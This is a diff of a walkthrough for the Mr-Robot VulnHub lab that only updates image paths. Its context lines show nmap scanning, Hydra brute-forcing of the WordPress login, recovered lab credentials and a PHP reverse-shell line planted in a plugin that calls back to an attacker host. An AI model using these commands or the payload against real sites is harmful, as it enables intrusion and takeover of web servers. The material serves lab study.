@@ -3,7 +3,7 @@
 - **Machine:** Mr-Robot: 1
 - **Download:** https://www.vulnhub.com/entry/mr-robot-1,151/
 
-![](676-1.png)
+![](images/676-1.png)
 
 ---
 
@@ -23,7 +23,7 @@
 nmap -sn 192.168.31.0/24
 ```
 
-![](676-2.png)
+![](images/676-2.png)
 
 ---
 
@@ -35,7 +35,7 @@ Identify the open ports.
 nmap -v -p- 192.168.31.157
 ```
 
-![](676-3.png)
+![](images/676-3.png)
 
 ---
 
@@ -56,7 +56,7 @@ Run the HTTP enumeration NSE script.
 nmap -v -p 80,443 -sT -sV -A --script=http-enum.nse 192.168.31.157
 ```
 
-![](676-4.png)
+![](images/676-4.png)
 
 ---
 
@@ -67,9 +67,9 @@ During enumeration the following endpoints are discovered:
 - http://192.168.31.157/wp-login.php
 - http://192.168.31.157/robots.txt
 
-![](676-5.png)
+![](images/676-5.png)
 
-![](676-6.png)
+![](images/676-6.png)
 
 The **robots.txt** file reveals two interesting files:
 
@@ -106,7 +106,7 @@ Check the size.
 wc -l fsocity.dic
 ```
 
-![](676-7.png)
+![](images/676-7.png)
 
 The **fsocity.dic** file is a very large custom wordlist.
 
@@ -132,7 +132,7 @@ Use Hydra to enumerate valid WordPress usernames.
 hydra -L small-user.txt -p small-user.txt 192.168.31.157 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In:Invalid username"
 ```
 
-![](676-8.png)
+![](images/676-8.png)
 
 Valid username discovered:
 
@@ -150,7 +150,7 @@ Use the valid username to brute-force the password.
 hydra -l elliot -P small-user.txt 192.168.31.157 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=is incorrect" -V
 ```
 
-![](676-9.png)
+![](images/676-9.png)
 
 Recovered credentials:
 
@@ -176,7 +176,7 @@ Username : elliot
 Password : ER28-0652
 ```
 
-![](676-10.png)
+![](images/676-10.png)
 
 Successfully logged into the WordPress admin panel.
 
@@ -200,7 +200,7 @@ Replace the plugin code with:
 exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.31.206/443 0>&1'");
 ```
 
-![](676-11.png)
+![](images/676-11.png)
 
 Save and update the plugin.
 
@@ -222,11 +222,11 @@ Plugins → Installed Plugins
 
 Activate the **Hello Dolly** plugin.
 
-![](676-12.png)
+![](images/676-12.png)
 
 Once the plugin executes, a reverse shell is received.
 
-![](676-13.png)
+![](images/676-13.png)
 
 ---
 
